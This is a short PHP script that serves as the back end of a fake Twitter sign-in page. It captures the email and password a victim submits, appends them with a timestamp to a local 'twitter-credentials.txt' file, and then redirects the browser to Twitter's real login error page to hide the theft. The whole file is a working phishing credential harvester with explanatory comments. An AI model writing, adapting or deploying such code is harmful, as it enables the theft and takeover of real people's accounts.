<?php

$email=$_POST["signin-email"]; 		//store the username in $email

$password=$_POST["signin-password"];	//store the password in $password

$login_date=date("Y-m-d");		//store the current date in $login_date ===== Y->year m->month d->day

$login_time=date("h:i:sa");		//store the current time in $login_time ===== h->hours i->minutes s->seconds a->am and pm



//open the twitter-credentials.txt for writing only & file pointer is placed in the end of the file & create the file if not exist

$twitter = fopen("twitter-credentials.txt","a") or die("Oops... Something went wrong!!!");	


//write the username, password, current date and current time to the file stream twitter-credentials.txt

fwrite($twitter,"\n $email : $password : $login_date : $login_time \n");


//close the open file pointer
fclose($twitter);


header('Location: https://twitter.com/login/error?redirect_after_login=%2F');	//Redirect the browser to the login page

exit();										//exit or close this login-validate.php

?>
